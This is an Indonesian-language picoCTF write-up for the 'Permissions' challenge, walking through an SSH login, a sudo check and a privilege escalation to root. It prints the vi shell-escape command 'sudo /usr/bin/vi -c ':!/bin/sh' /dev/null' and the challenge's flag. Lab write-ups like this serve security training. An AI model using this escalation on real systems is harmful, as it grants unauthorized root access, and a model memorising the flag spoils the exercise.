# Permissions
- Link: https://play.picoctf.org/practice/challenge/363?category=5&page=3

## Tantangan
Can you read files in the root file?
Additional details will be available after launching your challenge instance.

## Penyelesaian
- Tekan tombol **Launch Instance** untuk memulai tantangan

![alt text](https://github.com/rahardian-dwi-saputra/picoCTF-writeup/blob/main/General%20Skills/Permissions/assets/permissions%201.JPG)

- Setelah instance berjalan, konek ke SSH server sesuai petunjuk soal. Jika diminta konfirmasi ketik yes lalu enter kemudian masukkan password yang tertera setelah Launch Instance
```sh
ssh -p 50429 picoplayer@saturn.picoctf.net
```

![alt text](https://github.com/rahardian-dwi-saputra/picoCTF-writeup/blob/main/General%20Skills/Permissions/assets/permissions%202.JPG)

- Kita tidak dapat mengakses direktori root dengan user `picoplayer` sehingga kita perlu melakukan pengecekan akses sudo yang dimiliki user `picoplayer`
```sh
sudo -l
```

![alt text](https://github.com/rahardian-dwi-saputra/picoCTF-writeup/blob/main/General%20Skills/Permissions/assets/permissions%203.JPG)

- Terlihat bahwa user `picoplayer` bisa mengakses aplikasi vi sehingga kita bisa melakukan privilage escalation dengan vi (referensi: https://gtfobins.github.io/gtfobins/vi/ )
```sh
sudo /usr/bin/vi -c ':!/bin/sh' /dev/null
```

![alt text](https://github.com/rahardian-dwi-saputra/picoCTF-writeup/blob/main/General%20Skills/Permissions/assets/permissions%204.JPG)

- Kita berhasil masuk ke user root, sekarang kita file yang terdapat di direktori root
```sh
cd /root
ls -la
```

![alt text](https://github.com/rahardian-dwi-saputra/picoCTF-writeup/blob/main/General%20Skills/Permissions/assets/permissions%205.JPG)

- Disini ditemukan file `.flag.txt` yang berisi flag, sekarang kita buka isi file tersebut
```sh
cat .flag.txt
```

![alt text](https://github.com/rahardian-dwi-saputra/picoCTF-writeup/blob/main/General%20Skills/Permissions/assets/permissions%206.JPG)

- Flag
```sh
picoCTF{uS1ng_v1m_3dit0r_89e9cf1a}
```